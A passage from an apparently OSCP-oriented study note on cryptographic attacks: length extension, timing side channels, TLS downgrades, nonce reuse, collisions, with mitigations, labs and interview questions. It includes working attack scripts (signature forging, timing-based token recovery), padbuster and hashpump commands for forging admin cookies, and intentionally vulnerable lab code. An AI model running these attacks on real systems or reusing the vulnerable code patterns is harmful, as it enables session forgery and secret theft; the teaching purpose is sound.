    Original: signature = MD5(secret || "user_data")
    Goal: Forge signature for: secret || "user_data" || padding || "&admin=1"
    """
    
    original_data = b"user_data"
    original_hash = "e4d909c290d0fb1ca068ffaddf22cbd0"  # Known hash
    append_data = b"&admin=1"
    
    # We need to guess secret length (try 8-32)
    for secret_length in range(8, 33):
        sha = hlextend.new('md5')
        
        new_data = sha.extend(
            append_data,           # Data to append
            original_data,         # Original known data
            secret_length,         # Guessed secret length
            original_hash          # Original signature
        )
        
        new_hash = sha.hexdigest()
        
        print(f"Secret length {secret_length}:")
        print(f"  New data (hex): {new_data.hex()}")
        print(f"  New signature: {new_hash}")
        
        # In real attack, try this signature against the server
        # If server accepts it, we found the right secret length!

if __name__ == "__main__":
    length_extension_attack()
```

### HMAC Prevents Length Extension

```
+-------------------------------------------------------------------+
|                  HMAC vs H(secret||message)                        |
+-------------------------------------------------------------------+

VULNERABLE:
  sig = SHA256(secret || message)
  
  Length extension possible!

SECURE:
  sig = HMAC-SHA256(secret, message)
  
  HMAC formula:
    HMAC(K, m) = H((K ⊕ opad) || H((K ⊕ ipad) || m))
  
  The nested hashing prevents length extension.
  You can't continue the outer hash without knowing the key.

ALWAYS USE HMAC FOR SIGNATURES!

Wrong:
  signature = hashlib.sha256(secret + data).hexdigest()

Right:
  signature = hmac.new(secret, data, hashlib.sha256).hexdigest()

+-------------------------------------------------------------------+
```

---

## Timing Attacks

### String Comparison Timing

```
+-------------------------------------------------------------------+
|                    TIMING ATTACK BASICS                            |
+-------------------------------------------------------------------+

VULNERABLE COMPARISON:

def verify_token(provided, actual):
    if provided == actual:        # strcmp-style comparison
        return True
    return False

This comparison is NOT constant-time!

"AAAA" vs "SECRET":
  Compare A != S → Return False (1 comparison)

"SAAA" vs "SECRET":
  Compare S == S → Continue
  Compare A != E → Return False (2 comparisons)

"SEAA" vs "SECRET":
  Compare S == S → Continue
  Compare E == E → Continue
  Compare A != C → Return False (3 comparisons)

TIMING DIFFERENCE REVEALS CORRECT CHARACTERS!

Attacker measures response time:
  "AAAA" → 1.001ms
  "SAAA" → 1.002ms  ← Slightly longer! First char is 'S'
  "SBAA" → 1.001ms
  "SEAA" → 1.003ms  ← Even longer! Second char is 'E'
  ...

+-------------------------------------------------------------------+
```

### Python Timing Attack Implementation

```python
#!/usr/bin/env python3
"""
Timing Attack on String Comparison
"""

import requests
import time
import string
from statistics import mean

def measure_time(token, iterations=100):
    """Measure average response time"""
    times = []
    for _ in range(iterations):
        start = time.perf_counter()
        requests.post(
            "http://target.com/verify",
            data={"token": token}
        )
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return mean(times)

def timing_attack():
    """Recover secret token character by character"""
    charset = string.ascii_letters + string.digits
    recovered = ""
    token_length = 16  # Assumed or discovered
    
    for position in range(token_length):
        best_char = None
        best_time = 0
        
        for c in charset:
            test_token = recovered + c + "A" * (token_length - len(recovered) - 1)
            elapsed = measure_time(test_token)
            
            print(f"Testing '{test_token}': {elapsed:.6f}s")
            
            if elapsed > best_time:
                best_time = elapsed
                best_char = c
        
        recovered += best_char
        print(f"Found character: {best_char}, Token so far: {recovered}")
    
    return recovered

if __name__ == "__main__":
    secret = timing_attack()
    print(f"Recovered token: {secret}")
```

### Constant-Time Comparison

```python
# VULNERABLE - Variable time
def insecure_compare(a, b):
    if len(a) != len(b):
        return False
    for i in range(len(a)):
        if a[i] != b[i]:
            return False  # Early exit reveals position!
    return True

# SECURE - Constant time
import hmac

def secure_compare(a, b):
    return hmac.compare_digest(a, b)

# Manual constant-time (if hmac not available)
def constant_time_compare(a, b):
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)  # Always compare all bytes
    return result == 0
```

### Cache Timing Attacks

```
+-------------------------------------------------------------------+
|                    CACHE TIMING ATTACKS                            |
+-------------------------------------------------------------------+

AES implementations using lookup tables:
  - Table lookups depend on key bytes
  - Cache hits vs misses have different timing
  - Attacker can measure and deduce key bits

FLUSH+RELOAD Attack:
  1. Attacker flushes cache line
  2. Victim encrypts with secret key
  3. Attacker measures access time to table entries
  4. Fast access = entry was in cache = victim used it

SPECTRE/MELTDOWN:
  - Speculative execution leaks data through cache timing
  - CPU bug, not software bug
  - Mitigations in OS and hardware

PREVENTION:
  - Use constant-time implementations (bitsliced AES)
  - Hardware AES-NI instructions (timing-resistant)
  - Don't use lookup tables indexed by secrets

+-------------------------------------------------------------------+
```

---

## Downgrade Attacks

### TLS Downgrade Attacks

```
+-------------------------------------------------------------------+
|                    TLS DOWNGRADE ATTACK                            |
+-------------------------------------------------------------------+

LOGJAM (CVE-2015-4000):
  Attack on Diffie-Hellman key exchange
  
  Man-in-the-middle forces "export-grade" 512-bit DH
  Attacker can compute discrete log in reasonable time
  Decrypt traffic!

POODLE (CVE-2014-3566):
  Forces downgrade from TLS to SSLv3
  SSLv3 has padding oracle vulnerability
  Decrypt traffic byte by byte

FREAK (CVE-2015-0204):
  Forces "export-grade" RSA (512-bit keys)
  Factor weak keys and decrypt traffic

DROWN (CVE-2016-0800):
  Uses SSLv2 vulnerability
  Decrypt TLS traffic if server supports SSLv2

PREVENTION:
  - Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1
  - Use TLS 1.2+ only
  - Enable TLS_FALLBACK_SCSV
  - Remove weak cipher suites

+-------------------------------------------------------------------+
```

### Testing for Downgrade Vulnerabilities

```bash
# Check supported protocols with nmap
nmap --script ssl-enum-ciphers -p 443 target.com

# Check with testssl.sh
./testssl.sh target.com

# Check with sslyze
sslyze --regular target.com

# Check with OpenSSL
openssl s_client -connect target.com:443 -ssl3    # Should fail
openssl s_client -connect target.com:443 -tls1    # Should fail
openssl s_client -connect target.com:443 -tls1_1  # Should fail
openssl s_client -connect target.com:443 -tls1_2  # Should work
openssl s_client -connect target.com:443 -tls1_3  # Best!
```

---

## Key Reuse Vulnerabilities

### ECDSA Nonce Reuse

```
+-------------------------------------------------------------------+
|                   ECDSA NONCE REUSE                                |
+-------------------------------------------------------------------+

ECDSA Signature: (r, s) where:
  r = (k * G).x  (x-coordinate of k * generator)
  s = k^(-1) * (hash + private_key * r)

If same nonce k is used for two signatures:
  s1 = k^(-1) * (h1 + priv * r)
  s2 = k^(-1) * (h2 + priv * r)

Attack:
  s1 - s2 = k^(-1) * (h1 - h2)
  k = (h1 - h2) / (s1 - s2)

  Once k is known:
  priv = (s * k - h) / r

REAL-WORLD EXAMPLES:
  - PlayStation 3 (Sony) - Allowed piracy
  - Android Bitcoin Wallet - Funds stolen
  - Xbox 360 signing key - Recovered

PREVENTION:
  - Use RFC 6979 (deterministic nonce from message hash)
  - Or use EdDSA (Ed25519) which handles this automatically

+-------------------------------------------------------------------+
```

### RSA Common Modulus Attack

```
+-------------------------------------------------------------------+
|               RSA COMMON MODULUS ATTACK                            |
+-------------------------------------------------------------------+

If same message encrypted to two recipients sharing modulus n:

  c1 = m^e1 mod n
  c2 = m^e2 mod n

If gcd(e1, e2) = 1, we can recover m without private key!

Extended Euclidean algorithm gives:
  a*e1 + b*e2 = 1

Then:
  c1^a * c2^b = m^(a*e1) * m^(b*e2)
              = m^(a*e1 + b*e2)
              = m^1
              = m

Message recovered!

PREVENTION:
  - Each user must have unique modulus n
  - Never share RSA modulus

+-------------------------------------------------------------------+
```

---

## Hash Collision Attacks

### MD5 Collision Attack

```
+-------------------------------------------------------------------+
|                    MD5 COLLISION                                   |
+-------------------------------------------------------------------+

MD5 collisions can be generated in seconds:

Two different files with SAME MD5 hash!

Use case exploit:
  - Create two programs: safe.exe and malware.exe
  - Both have same MD5 hash
  - Get safe.exe approved/signed
  - Replace with malware.exe

Collision Generation:
  $ hashclash -p prefix.bin -o collision1.bin collision2.bin

REAL-WORLD IMPACT:
  - Flame malware (2012): Forged Windows Update certificates
  - Used MD5 collision to sign malware as Microsoft

+-------------------------------------------------------------------+
```

### SHA-1 Collision (SHAttered)

```
+-------------------------------------------------------------------+
|                   SHA-1 COLLISION                                  |
+-------------------------------------------------------------------+

2017: Google/CWI produced first SHA-1 collision
  - Two different PDF files
  - Same SHA-1 hash
  - Cost: ~$100,000 in cloud computing

Impact:
  - Git used SHA-1 (now moving to SHA-256)
  - Many systems trusted SHA-1 for integrity
  - Certificate forgery possible

Timeline:
  2005: Theoretical weakness found
  2017: Practical collision (SHAttered)
  2020: Chosen-prefix collision (cheaper)

LESSON:
  - MD5: Broken, never use
  - SHA-1: Deprecated, avoid
  - SHA-256+: Currently secure

+-------------------------------------------------------------------+
```

---

## Real-World Attack Examples

### BEAST (Browser Exploit Against SSL/TLS)

```
+-------------------------------------------------------------------+
|                     BEAST ATTACK (2011)                            |
+-------------------------------------------------------------------+

Target: TLS 1.0 with CBC mode
Vulnerability: Predictable IV (IV = previous ciphertext block)

Attack:
  - Attacker controls some plaintext (via JavaScript)
  - Can guess bytes in encrypted cookies
  - CBC mode + known IV = chosen-plaintext attack

Impact:
  - HTTPS cookies could be decrypted
  - Session hijacking possible

Mitigations:
  - TLS 1.1+ (random IV)
  - 1/n-1 record splitting
  - RC4 (but RC4 is now broken too)

Modern status: Fixed in TLS 1.1+

+-------------------------------------------------------------------+
```

### CRIME/BREACH (Compression Attacks)

```
+-------------------------------------------------------------------+
|                  CRIME & BREACH ATTACKS                            |
+-------------------------------------------------------------------+

CRIME (Compression Ratio Info-leak Made Easy):
  Target: TLS compression
  
  Attack:
    - Attacker controls part of request
    - Compression ratio varies based on repeated content
    - Guess secret bytes: if compression increases, guess is correct

  Example:
    Request + "Cookie=A" → Compressed size: 100 bytes
    Request + "Cookie=S" → Compressed size: 99 bytes  ← Match!
    
    Smaller = cookie starts with 'S'

BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext):
  Target: HTTP compression (gzip)
  
  Similar attack on response body compression
  Can extract CSRF tokens, session data

Mitigations:
  - Disable TLS compression (CRIME)
  - Separate secrets from attacker-controlled content
  - Add random padding
  - Rate limiting

+-------------------------------------------------------------------+
```

### Heartbleed (CVE-2014-0160)

```
+-------------------------------------------------------------------+
|                    HEARTBLEED (2014)                               |
+-------------------------------------------------------------------+

Not a cryptographic attack per se, but OpenSSL implementation bug.

The bug:
  TLS heartbeat request: "Echo back my 16-byte message"
  But attacker says: "Echo back 64KB of my 16-byte message"
  
  OpenSSL didn't validate length!
  
  Server returns: [16 bytes] + [64KB of adjacent memory]
  
  Adjacent memory might contain:
    - Private keys
    - Session tokens
    - Passwords
    - Other users' data

Impact:
  - ~17% of "secure" web servers affected
  - Private keys exposed
  - Mass re-issuance of certificates

Detection:
  $ nmap -p 443 --script ssl-heartbleed target.com

+-------------------------------------------------------------------+
```

### ROBOT Attack (Return Of Bleichenbacher's Oracle Threat)

```
+-------------------------------------------------------------------+
|                    ROBOT ATTACK (2017)                             |
+-------------------------------------------------------------------+

Target: RSA key exchange in TLS

Original Bleichenbacher attack (1998):
  - PKCS#1 v1.5 padding oracle
  - Server reveals if decryption has valid padding
  - ~1 million queries to decrypt

ROBOT (2017):
  - 19-year-old vulnerability still present!
  - Many vendors had incomplete fixes
  - Facebook, Citrix, Cisco, F5 affected

Attack:
  - Detect padding oracle through error messages or timing
  - Decrypt TLS pre-master secret
  - Forge signatures

Mitigation:
  - Use RSA-OAEP instead of PKCS#1 v1.5
  - Or use ECDHE key exchange (preferred)

+-------------------------------------------------------------------+
```

---

## OSCP Relevance

### Common OSCP Crypto Scenarios

```
+-------------------------------------------------------------------+
|              OSCP CRYPTOGRAPHIC CHALLENGES                         |
+-------------------------------------------------------------------+

1. PADDING ORACLE IN WEB APPS
   - Encrypted cookies/tokens
   - Different errors for padding vs decryption
   - Use padbuster to decrypt/forge

2. WEAK ENCRYPTION IN CUSTOM APPS
   - XOR "encryption"
   - ECB mode patterns
   - Hardcoded keys

3. SSL/TLS MISCONFIGURATIONS
   - Self-signed certificates
   - Weak cipher suites
   - Outdated protocols

4. ENCRYPTED CREDENTIALS
   - Base64 "encryption" (just encoding!)
   - Symmetric encryption with known/guessable key
   - Reversible encryption in databases

5. SSH KEY ISSUES
   - Weak key generation (Debian bug)
   - Shared private keys
   - Readable key files

+-------------------------------------------------------------------+
```

### OSCP Attack Checklist

```bash
# 1. Check for weak SSL/TLS
nmap --script ssl-enum-ciphers -p 443 $TARGET
testssl.sh $TARGET

# 2. Look for padding oracle
# Capture encrypted cookie, use padbuster
padbuster "http://$TARGET/page" "ENCRYPTED_COOKIE" 16 -encoding 0

# 3. Check for ECB mode
# Look for repeated 16/32-byte patterns in base64 cookies
echo "COOKIE_VALUE" | base64 -d | xxd

# 4. Test for timing vulnerabilities
# Compare response times for different inputs

# 5. Look for weak custom crypto
# Base64, XOR, ROT13, simple substitution
# Run through CyberChef: https://gchq.github.io/CyberChef/

# 6. Check for key reuse
# Same encrypted value for same plaintext = ECB or stream cipher issue
```

---

## Hands-On Labs

### Lab 1: Padding Oracle Attack

```markdown
OBJECTIVE: Decrypt a cookie using padding oracle

SETUP:
1. Use a vulnerable web app (PentesterLab, DVWA, or custom)
2. Capture an encrypted session cookie

STEPS:
1. Identify the encryption (16-byte blocks = AES)
2. Test for padding oracle:
   - Modify last byte of ciphertext
   - Observe different error responses
3. Use padbuster:
   padbuster "http://target/page?cookie=ENCRYPTED" "ENCRYPTED" 16 -encoding 0
4. Decrypt the cookie
5. Forge a new cookie with admin privileges

EXPECTED OUTCOME:
- Recover plaintext: "user=guest&role=user"
- Forge: "user=admin&role=admin"
```

### Lab 2: ECB Byte-at-a-Time

```markdown
OBJECTIVE: Recover secret using ECB oracle

SETUP:
Create vulnerable Flask app:

```python
from flask import Flask, request
from Crypto.Cipher import AES
from base64 import b64encode
import os

app = Flask(__name__)
KEY = os.urandom(16)
SECRET = b"FLAG{ecb_is_weak_123}"

def pad(data):
    n = 16 - (len(data) % 16)
    return data + bytes([n] * n)

@app.route('/encrypt')
def encrypt():
    user_input = request.args.get('data', '').encode()
    plaintext = pad(user_input + SECRET)
    cipher = AES.new(KEY, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return b64encode(ciphertext)

if __name__ == '__main__':
    app.run(debug=True)
```

STEPS:
1. Detect block size (send increasing 'A's)
2. Confirm ECB (same input = same output)
3. Implement byte-at-a-time attack
4. Recover the SECRET flag

EXPECTED OUTCOME:
- Recovered: "FLAG{ecb_is_weak_123}"
```

### Lab 3: CBC Bit Flipping

```markdown
OBJECTIVE: Modify encrypted cookie to gain admin access

SETUP:
Target cookie decrypts to: "username=guest;admin=false;token=xyz"

STEPS:
1. Get encrypted cookie
2. Calculate position of "false" in plaintext
3. XOR to flip "false" → "true " (note: same length!)
   'f' ^ 't' = 0x12
   'a' ^ 'r' = 0x13
   'l' ^ 'u' = 0x19
   's' ^ 'e' = 0x16
   'e' ^ ' ' = 0x45
4. Apply XOR to PREVIOUS cipher block at those positions
5. Send modified cookie

EXPECTED OUTCOME:
- Server accepts cookie as admin
- Previous block becomes garbage (may need creative positioning)
```

### Lab 4: Length Extension Attack

```markdown
OBJECTIVE: Forge a signed request without knowing the secret

SCENARIO:
- Server validates: signature = MD5(secret || data)
- You have valid request: data = "user=guest", sig = "abc123..."
- Goal: Create valid signature for "user=guest&admin=true"

STEPS:
1. Install hashpump: apt install hashpump
2. Use hashpump to extend:
   hashpump -s abc123... -d "user=guest" -k 16 -a "&admin=true"
3. URL-encode the new data (includes padding bytes)
4. Send with new signature

EXPECTED OUTCOME:
- Server accepts forged signature
- You gain admin access
```

### Lab 5: Timing Attack

```markdown
OBJECTIVE: Recover API key using timing side channel

SETUP:
Create vulnerable endpoint:

```python
import time

REAL_API_KEY = "SecretAPIKey123"

def check_key(provided):
    if len(provided) != len(REAL_API_KEY):
        return False
    for i in range(len(REAL_API_KEY)):
        if provided[i] != REAL_API_KEY[i]:
            return False
        time.sleep(0.01)  # Artificial delay to make timing obvious
    return True
```

STEPS:
1. Measure baseline response time
2. Try each character, measure time
3. Longest time = correct character
4. Repeat for each position

EXPECTED OUTCOME:
- Recovered key: "SecretAPIKey123"
```

---

## Interview Questions

### Basic Level

1. **Q: What is a padding oracle attack?**
   
   A: An attack that exploits error messages or timing differences that reveal whether decrypted data has valid padding. By manipulating ciphertext and observing responses, an attacker can decrypt data byte-by-byte without knowing the key.

2. **Q: Why is ECB mode insecure?**
   
   A: ECB encrypts identical plaintext blocks to identical ciphertext blocks, preserving patterns. This allows attackers to detect repeated data, rearrange blocks, and potentially decrypt through chosen-plaintext attacks.

3. **Q: What is nonce reuse and why is it dangerous?**
   
   A: Nonce reuse means using the same nonce/IV twice with the same key. In stream ciphers or CTR mode, this allows XOR of ciphertexts to cancel the keystream, revealing plaintext relationships. In GCM, it also leaks the authentication key.

### Intermediate Level

4. **Q: Explain the difference between Encrypt-then-MAC and MAC-then-Encrypt.**
   
   A: Encrypt-then-MAC computes the MAC over ciphertext, allowing verification before decryption (preventing padding oracle attacks). MAC-then-Encrypt computes MAC over plaintext then encrypts both, requiring decryption before MAC verification which can leak information.

5. **Q: How does a length extension attack work?**
   
   A: For Merkle-Damgård hashes (MD5, SHA-1, SHA-256), knowing H(secret||msg) reveals the internal state. An attacker can compute H(secret||msg||padding||extension) by continuing from that state, forging valid signatures without knowing the secret.

6. **Q: What is a timing attack and how do you prevent it?**
   
   A: Timing attacks measure execution time differences to leak secrets (e.g., string comparison that exits early on mismatch). Prevention requires constant-time operations: always compare all bytes, use hmac.compare_digest(), avoid branching on secret values.

### Advanced Level

7. **Q: Describe the ROBOT attack and its implications.**
   
   A: ROBOT exploits PKCS#1 v1.5 padding oracles in RSA key exchange. Servers leak whether decrypted data has valid padding through error messages or timing. With ~million queries, attackers can decrypt TLS sessions or forge signatures. It showed 19-year-old vulnerabilities still exist.

8. **Q: How would you attack GCM with nonce reuse?**
   
   A: GCM nonce reuse allows: 1) XOR attack to recover plaintexts, 2) Recovery of authentication key H through polynomial arithmetic over GF(2^128). With H, attackers can forge authentication tags for arbitrary messages.

9. **Q: Explain how CRIME/BREACH attacks work.**
   
   A: These attacks exploit compression to leak secrets. When attacker-controlled data compresses well with secret data (matching bytes), the compressed size decreases. By trying different guesses and observing size changes, attackers can extract secrets byte-by-byte.

---

## Quick Reference

### Attack Identification Cheat Sheet

```
+-------------------------------------------------------------------+
|              SYMPTOM → ATTACK MAPPING                              |
+-------------------------------------------------------------------+

SYMPTOM                           | LIKELY ATTACK
----------------------------------|--------------------------------
Different errors for invalid      | Padding Oracle
padding vs invalid data           |

Repeated patterns in ciphertext   | ECB Mode - Pattern Analysis

Same ciphertext for same input    | ECB Mode - Replay/Manipulation

XOR of two ciphertexts reveals    | Nonce/IV Reuse
meaningful data                   |

sig = H(secret || data)           | Length Extension Attack

Variable response time based      | Timing Attack
on input                          |

Supports SSLv3, TLS 1.0           | Downgrade Attack potential

Uses MD5 or SHA-1 for             | Collision Attack potential
signatures/certificates           |

+-------------------------------------------------------------------+
```

### Tool Quick Reference

```bash
# === PADDING ORACLE ===
padbuster "URL" "ENCRYPTED" BLOCKSIZE -encoding 0
padbuster "URL" "ENCRYPTED" 16 -plaintext "admin=1"

# === SSL/TLS TESTING ===
testssl.sh target.com
sslyze --regular target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# === LENGTH EXTENSION ===
hashpump -s SIGNATURE -d "original_data" -k KEY_LENGTH -a "append"

# === HASH COLLISION ===
hashclash -p prefix -o out1 out2

# === GENERAL CRYPTO ANALYSIS ===
# CyberChef: https://gchq.github.io/CyberChef/
# Decode Base64, XOR, identify encodings

# === TIMING ATTACK ===
# Use Python with time.perf_counter() for precision
# Average multiple requests to reduce noise
```

### Mitigation Summary

```
+-------------------------------------------------------------------+
|                   MITIGATION QUICK REFERENCE                       |
+-------------------------------------------------------------------+

VULNERABILITY          | MITIGATION
-----------------------|--------------------------------------------
Padding Oracle         | Use AEAD (GCM), Encrypt-then-MAC, 
                       | constant-time errors
ECB Mode               | Use CBC, CTR, or GCM modes
Nonce Reuse            | Random nonces, RFC 6979, unique per message
Length Extension       | Use HMAC, not H(secret||msg)
Timing Leaks           | hmac.compare_digest(), constant-time code
Downgrade              | Disable weak protocols, TLS 1.2+ only
MD5/SHA1 Collisions    | Use SHA-256+ for signatures

+-------------------------------------------------------------------+
```

---

## Related Files

- [[03_Hashing_and_Integrity]] - Hash function fundamentals
- [[04_Symmetric_Encryption]] - Block cipher modes (ECB, CBC, GCM)
- [[06_PKI_TLS_and_Certificates]] - TLS and certificate security
- [[07_Password_Cracking]] - Cracking hashed passwords

---

## Resources

### Research Papers
- [Padding Oracle Attacks](https://www.iacr.org/archive/eurocrypt2002/23320530/cbc02_e02.pdf)
- [SHAttered](https://shattered.io/)
- [ROBOT Attack](https://robotattack.org/)

### Tools
- [PadBuster](https://github.com/GDSSecurity/PadBuster)
- [HashPump](https://github.com/bwall/HashPump)
- [testssl.sh](https://testssl.sh/)
- [CyberChef](https://gchq.github.io/CyberChef/)

### Practice
- [Cryptopals Challenges](https://cryptopals.com/)
- [PentesterLab](https://pentesterlab.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

*Last updated: 2025-02-07*
